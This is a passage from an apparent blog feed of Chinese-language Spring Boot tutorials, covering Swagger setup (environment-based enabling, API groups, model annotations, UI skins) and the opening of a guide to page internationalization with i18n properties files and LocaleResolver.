class="hljs-string">&quot;test&quot;</span>);<br>    <span class="hljs-comment">// 判断当前是否处于该环境</span><br>    <span class="hljs-comment">// 通过 enable() 接收此参数判断是否要显示</span><br>    <span class="hljs-keyword">boolean</span> b = environment.acceptsProfiles(of);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Docket(DocumentationType.SWAGGER_2)<br>        .apiInfo(apiInfo())<br>        .enable(b) <span class="hljs-comment">//配置是否启用Swagger，如果是false，在浏览器将无法访问</span><br>        .select()<span class="hljs-comment">// 通过.select()方法，去配置扫描接口,RequestHandlerSelectors配置如何扫描接口</span><br>        .apis(RequestHandlerSelectors.basePackage(<span class="hljs-string">&quot;com.kuang.swagger.controller&quot;</span>))<br>        <span class="hljs-comment">// 配置如何通过path过滤,即这里只扫描请求以/kuang开头的接口</span><br>        .paths(PathSelectors.ant(<span class="hljs-string">&quot;/kuang/**&quot;</span>))<br>        .build();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>3、可以在项目中增加一个dev的配置文件查看效果！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IExpkhknhzRFQicsic8yibm9Zf87yQGBYZKyqCsjP79C67S0NgdOmrQWJ7tkpPsdkrWQeQiaIZia7VD8w/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><blockquote><h3 id="配置API分组"><a href="#配置API分组" class="headerlink" title="配置API分组"></a>配置API分组</h3></blockquote><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IExpkhknhzRFQicsic8yibm9Z7k4Y8iaVnHtPd78o82ff8hItej9Cyf0wvbG8u8KgXic7gVh77NoZw4RQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>1、如果没有配置分组，默认是default。通过groupName()方法即可配置分组：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Docket <span class="hljs-title">docket</span><span class="hljs-params">(Environment environment)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Docket(DocumentationType.SWAGGER_2).apiInfo(apiInfo())<br>        .groupName(<span class="hljs-string">&quot;hello&quot;</span>) <span class="hljs-comment">// 配置分组</span><br>        <span class="hljs-comment">// 省略配置....</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>2、重启项目查看分组</p><p>3、如何配置多个分组？配置多个分组只需要配置多个docket即可：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Docket <span class="hljs-title">docket1</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Docket(DocumentationType.SWAGGER_2).groupName(<span class="hljs-string">&quot;group1&quot;</span>);<br>&#125;<br><span class="hljs-meta">@Bean</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Docket <span class="hljs-title">docket2</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Docket(DocumentationType.SWAGGER_2).groupName(<span class="hljs-string">&quot;group2&quot;</span>);<br>&#125;<br><span class="hljs-meta">@Bean</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Docket <span class="hljs-title">docket3</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Docket(DocumentationType.SWAGGER_2).groupName(<span class="hljs-string">&quot;group3&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>4、重启项目查看即可</p><blockquote><h3 id="实体配置"><a href="#实体配置" class="headerlink" title="实体配置"></a>实体配置</h3></blockquote><p>1、新建一个实体类</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@ApiModel(&quot;用户实体&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-meta">@ApiModelProperty(&quot;用户名&quot;)</span><br>    <span class="hljs-keyword">public</span> String username;<br>    <span class="hljs-meta">@ApiModelProperty(&quot;密码&quot;)</span><br>    <span class="hljs-keyword">public</span> String password;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>2、只要这个实体在<strong>请求接口</strong>的返回值上（即使是泛型），都能映射到实体项中：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/getUser&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">getUser</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> User();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>3、重启查看测试</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IExpkhknhzRFQicsic8yibm9ZS0qBoaXrHX5r42ic5kUDzv5gaiaVqVeMBne4TDe5JLRPqRShgY3WiaQPg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>注：并不是因为@ApiModel这个注解让实体显示在这里了，而是只要出现在接口方法的返回值上的实体都会显示在这里，而@ApiModel和@ApiModelProperty这两个注解只是为实体添加注释的。</p><p>@ApiModel为类添加注释</p><p>@ApiModelProperty为类属性添加注释</p><blockquote><h3 id="常用注解"><a href="#常用注解" class="headerlink" title="常用注解"></a>常用注解</h3></blockquote><p>Swagger的所有注解定义在io.swagger.annotations包下</p><p>下面列一些经常用到的，未列举出来的可以另行查阅说明：</p><table><thead><tr><th>Swagger注解</th><th>简单说明</th></tr></thead><tbody><tr><td>@Api(tags = “xxx模块说明”)</td><td>作用在模块类上</td></tr><tr><td>@ApiOperation(“xxx接口说明”)</td><td>作用在接口方法上</td></tr><tr><td>@ApiModel(“xxxPOJO说明”)</td><td>作用在模型类上：如VO、BO</td></tr><tr><td>@ApiModelProperty(value = “xxx属性说明”,hidden = true)</td><td>作用在类方法和属性上，hidden设置为true可以隐藏该属性</td></tr><tr><td>@ApiParam(“xxx参数说明”)</td><td>作用在参数、方法和字段上，类似@ApiModelProperty</td></tr></tbody></table><p>我们也可以给请求的接口配置一些注释</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@ApiOperation(&quot;狂神的接口&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/kuang&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">kuang</span><span class="hljs-params">(<span class="hljs-meta">@ApiParam(&quot;这个名字会被返回&quot;)</span>String username)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> username;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这样的话，可以给一些比较难理解的属性或者接口，增加一些配置信息，让人更容易阅读！</p><p>相较于传统的Postman或Curl方式测试接口，使用swagger简直就是傻瓜式操作，不需要额外说明文档(写得好本身就是文档)而且更不容易出错，只需要录入数据然后点击Execute，如果再配合自动化框架，可以说基本就不需要人为操作了。</p><p>Swagger是个优秀的工具，现在国内已经有很多的中小型互联网公司都在使用它，相较于传统的要先出Word接口文档再测试的方式，显然这样也更符合现在的快速迭代开发行情。当然了，提醒下大家在正式环境要记得关闭Swagger，一来出于安全考虑二来也可以节省运行时内存。</p><blockquote><h3 id="拓展：其他皮肤"><a href="#拓展：其他皮肤" class="headerlink" title="拓展：其他皮肤"></a>拓展：其他皮肤</h3></blockquote><p>我们可以导入不同的包实现不同的皮肤定义：</p><p>1、默认的  <strong>访问 <a href="http://localhost:8080/swagger-ui.html">http://localhost:8080/swagger-ui.html</a></strong></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IExpkhknhzRFQicsic8yibm9ZrYUroibnsmILAYo1PyuaSDAkrqUvlNibxW9S9niaRomPFd9rrD6SY4wjA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>2、bootstrap-ui  <strong>访问 <a href="http://localhost:8080/doc.html">http://localhost:8080/doc.html</a></strong></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 引入swagger-bootstrap-ui包 /doc.html--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.xiaoymin<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>swagger-bootstrap-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IExpkhknhzRFQicsic8yibm9ZxQ9fXkPFt9TtX6PiaPDWWFSCJQK6H0ibiagM2w2f99zqHuOJffyRycCIg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>3、Layui-ui  <strong>访问 <a href="http://localhost:8080/docs.html">http://localhost:8080/docs.html</a></strong></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 引入swagger-ui-layer包 /docs.html--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.caspar-chen<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>swagger-ui-layer<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IExpkhknhzRFQicsic8yibm9ZYA6g5VyspYIqFMokAGg7dbx47P2ibC8Z80saA7XdrByPFhgmrduSHbA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>4、mg-ui  <strong>访问 <a href="http://localhost:8080/document.html">http://localhost:8080/document.html</a></strong></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 引入swagger-ui-layer包 /document.html--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.zyplayer<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>swagger-mg-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IExpkhknhzRFQicsic8yibm9ZBJPCcHFicV2dklg3l88IuYia3OIFNfNVbWZXpppPS93jghTUJiaeJQx6Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>]]></content>
    
    
    <categories>
      
      <category>Spring Boot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Springboot</tag>
      
      <tag>Swagger</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>页面国际化</title>
    <link href="/2021/04/12/SpringBoot/%E9%A1%B5%E9%9D%A2%E5%9B%BD%E9%99%85%E5%8C%96/"/>
    <url>/2021/04/12/SpringBoot/%E9%A1%B5%E9%9D%A2%E5%9B%BD%E9%99%85%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>有的时候，我们的网站会去涉及中英文甚至多语言的切换，这时候我们就需要学习国际化了！</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>先在IDEA中统一设置properties的编码问题！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IliczmpA1zCRu0ia5micU55ETgrgicvxqgYPVvcBGBcyId5qbK4pZ6iaFW6DU8DaTibNOqwybhxvvBiapZg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>编写国际化配置文件，抽取页面需要显示的国际化页面消息。我们可以去登录页面查看一下，哪些内容我们需要编写国际化的配置！</p><h2 id="配置文件编写"><a href="#配置文件编写" class="headerlink" title="配置文件编写"></a>配置文件编写</h2><p>1、我们在resources资源文件下新建一个i18n目录，存放国际化配置文件</p><p>2、建立一个login.properties文件，还有一个login_zh_CN.properties；发现IDEA自动识别了我们要做国际化操作；文件夹变了！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IliczmpA1zCRu0ia5micU55ETBiaXib28mib2iaUyqOTW1VXCLK6b55N9Jy2AbA96KRSyQjCkgCibhDaWung/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>3、我们可以在这上面去新建一个文件；</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IliczmpA1zCRu0ia5micU55ETozDglSZ32ZAdIRzuqn8NicymJyZQUMXIq0icYPwzNstBJdO3dXL1CbRA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>弹出如下页面：我们再添加一个英文的；</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IliczmpA1zCRu0ia5micU55ETv0bcvSfWDIdiaTYIoPL7BhLRb8wb0vAbNmMCpxrkAibibAwVtAJV55tEQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>这样就快捷多了！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IliczmpA1zCRu0ia5micU55ETMSkXZicouLDxJiaUbyWRTB3Vib2UBxJWEIqxL5reXbkXT8iaYNQOn2M9Bg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>4、接下来，我们就来编写配置，我们可以看到idea下面有另外一个视图；</strong></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IliczmpA1zCRu0ia5micU55ETp6raySXNEHanXLFuq4OsCJOQ0DBKibQyohPUDen5OUYsfYIPD9tFjBQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>这个视图我们点击 + 号就可以直接添加属性了；我们新建一个login.tip，可以看到边上有三个文件框可以输入</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IliczmpA1zCRu0ia5micU55ETru2CdF5btNFhLdCCkusK5VkJRIfnBic8iaScfKkkKfFcBQ90pexU05Gw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>我们添加一下首页的内容！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IliczmpA1zCRu0ia5micU55ETRPAF4T1brBr2pBydUuNjlkkUtThqlJCKN4lQ2rCN0BXrn957u3CdlA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>然后依次添加其他页面内容即可！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IliczmpA1zCRu0ia5micU55ETA91ZDRtZ4hBZ1dtn7CLZ9xzlwfDpUhqT8sTQmCncsLYEH5r0fIFF9w/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>然后去查看我们的配置文件；</p><p>login.properties ：默认</p><figure class="highlight properties"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-meta">login.btn</span>=<span class="hljs-string">登录</span><br><span class="hljs-meta">login.password</span>=<span class="hljs-string">密码</span><br><span class="hljs-meta">login.remember</span>=<span class="hljs-string">记住我</span><br><span class="hljs-meta">login.tip</span>=<span class="hljs-string">请登录</span><br><span class="hljs-meta">login.username</span>=<span class="hljs-string">用户名</span><br></code></pre></div></td></tr></table></figure><p>英文：</p><figure class="highlight properties"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-meta">login.btn</span>=<span class="hljs-string">Sign in</span><br><span class="hljs-meta">login.password</span>=<span class="hljs-string">Password</span><br><span class="hljs-meta">login.remember</span>=<span class="hljs-string">Remember me</span><br><span class="hljs-meta">login.tip</span>=<span class="hljs-string">Please sign in</span><br><span class="hljs-meta">login.username</span>=<span class="hljs-string">Username</span><br></code></pre></div></td></tr></table></figure><p>中文：</p><figure class="highlight properties"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-meta">login.btn</span>=<span class="hljs-string">登录</span><br><span class="hljs-meta">login.password</span>=<span class="hljs-string">密码</span><br><span class="hljs-meta">login.remember</span>=<span class="hljs-string">记住我</span><br><span class="hljs-meta">login.tip</span>=<span class="hljs-string">请登录</span><br><span class="hljs-meta">login.username</span>=<span class="hljs-string">用户名</span><br></code></pre></div></td></tr></table></figure><p>OK，配置文件步骤搞定！</p><h2 id="配置文件生效探究"><a href="#配置文件生效探究" class="headerlink" title="配置文件生效探究"></a>配置文件生效探究</h2><p>我们去看一下SpringBoot对国际化的自动配置！这里又涉及到一个类：MessageSourceAutoConfiguration</p><p>里面有一个方法，这里发现SpringBoot已经自动配置好了管理我们国际化资源文件的组件 ResourceBundleMessageSource；</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">// 获取 properties 传递过来的值进行判断</span><br><span class="hljs-meta">@Beanpublic</span><br><span class="hljs-function">MessageSource <span class="hljs-title">messageSource</span><span class="hljs-params">(MessageSourceProperties properties)</span> </span>&#123;   <br>    ResourceBundleMessageSource messageSource = <span class="hljs-keyword">new</span> ResourceBundleMessageSource();   <br>    <span class="hljs-keyword">if</span> (StringUtils.hasText(properties.getBasename())) &#123;      <br>        <span class="hljs-comment">// 设置国际化文件的基础名（去掉语言国家代码的）      </span><br>        messageSource.setBasenames(       <br>            StringUtils.commaDelimitedListToStringArray(     <br>                StringUtils.trimAllWhitespace(properties.getBasename()))<br>        );   <br>    &#125; <br>    <span class="hljs-keyword">if</span> (properties.getEncoding() != <span class="hljs-keyword">null</span>) &#123;   <br>        messageSource.setDefaultEncoding(properties.getEncoding().name()); <br>    &#125;   <br>    messageSource.setFallbackToSystemLocale(properties.isFallbackToSystemLocale()); <br>    Duration cacheDuration = properties.getCacheDuration(); <br>    <span class="hljs-keyword">if</span> (cacheDuration != <span class="hljs-keyword">null</span>) &#123;    <br>        messageSource.setCacheMillis(cacheDuration.toMillis());  <br>    &#125; <br>    messageSource.setAlwaysUseMessageFormat(properties.isAlwaysUseMessageFormat());   <br>    messageSource.setUseCodeAsDefaultMessage(properties.isUseCodeAsDefaultMessage());<br>    <span class="hljs-keyword">return</span> messageSource;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>我们真实 的情况是放在了i18n目录下，所以我们要去配置这个messages的路径；</p><figure class="highlight properties"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-meta">spring.messages.basename</span>=<span class="hljs-string">i18n.login</span><br></code></pre></div></td></tr></table></figure><h2 id="配置页面国际化值"><a href="#配置页面国际化值" class="headerlink" title="配置页面国际化值"></a>配置页面国际化值</h2><p>去页面获取国际化的值，查看Thymeleaf的文档，找到message取值操作为：#{…}。我们去页面测试下：</p><p>IDEA还有提示，非常智能的！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IliczmpA1zCRu0ia5micU55ETbj7aBK25N5G2NGibmb9LmHGySYic9myjX0pZ7EOcBfYC03c1yBFEBxfQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>我们可以去启动项目，访问一下，发现已经自动识别为中文的了！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IliczmpA1zCRu0ia5micU55ETN9iagOo88CAiaDf4d09lGGBsEhzdpsz2libgVuHdeBdWPc6QUMZficxFJA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>但是我们想要更好！可以根据按钮自动切换中文英文！</strong></p><h2 id="配置国际化解析"><a href="#配置国际化解析" class="headerlink" title="配置国际化解析"></a>配置国际化解析</h2><p>在Spring中有一个国际化的Locale （区域信息对象）；里面有一个叫做LocaleResolver （获取区域信息对象）的解析器！</p><p>我们去我们webmvc自动配置文件，寻找一下！看到SpringBoot默认配置：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-meta">@ConditionalOnMissingBean</span><br><span class="hljs-meta">@ConditionalOnProperty(prefix = &quot;spring.mvc&quot;, name = &quot;locale&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> LocaleResolver <span class="hljs-title">localeResolver</span><span class="hljs-params">()</span> </span>&#123;   <br>    <span class="hljs-comment">// 容器中没有就自己配，有的话就用用户配置的   </span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.mvcProperties.getLocaleResolver() == WebMvcProperties.LocaleResolver.FIXED) &#123;    <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> FixedLocaleResolver(<span class="hljs-keyword">this</span>.mvcProperties.getLocale());<br>    &#125;    <br>    <span class="hljs-comment">// 接收头国际化分解   </span><br>    AcceptHeaderLocaleResolver localeResolver = <span class="hljs-keyword">new</span> AcceptHeaderLocaleResolver();   <br>    localeResolver.setDefaultLocale(<span class="hljs-keyword">this</span>.mvcProperties.getLocale()); <br>    <span class="hljs-keyword">return</span> localeResolver;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>AcceptHeaderLocaleResolver 这个类中有一个方法</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Locale <span class="hljs-title">resolveLocale</span><span class="hljs-params">(HttpServletRequest request)</span> </span>&#123;  <br>    Locale defaultLocale = <span class="hljs-keyword">this</span>.getDefaultLocale();  <br>    <span class="hljs-comment">// 默认的就是根据请求头带来的区域信息获取Locale进行国际化 </span><br>    <span class="hljs-keyword">if</span> (defaultLocale != <span class="hljs-keyword">null</span> &amp;&amp; request.getHeader(<span class="hljs-string">&quot;Accept-Language&quot;</span>) == <span class="hljs-keyword">null</span>) &#123;    <br>        <span class="hljs-keyword">return</span> defaultLocale;  <br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;   <br>        Locale requestLocale = request.getLocale();      <br>        List&lt;Locale&gt; supportedLocales = <span class="hljs-keyword">this</span>.getSupportedLocales();     <br>        <span class="hljs-keyword">if</span> (!supportedLocales.isEmpty() &amp;&amp; !supportedLocales.contains(requestLocale)) &#123;    <br>            Locale supportedLocale = <span class="hljs-keyword">this</span>.findSupportedLocale(request, supportedLocales);     <br>            <span class="hljs-keyword">if</span> (supportedLocale != <span class="hljs-keyword">null</span>) &#123;       <br>                <span class="hljs-keyword">return</span> supportedLocale;      <br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;      <br>                <span class="hljs-keyword">return</span> defaultLocale != <span class="hljs-keyword">null</span> ? defaultLocale : requestLocale;     <br>            &#125;      <br>        &#125; <br>        <span class="hljs-keyword">else</span> &#123;    <br>            <span class="hljs-keyword">return</span> requestLocale;      <br>        &#125;    <br>    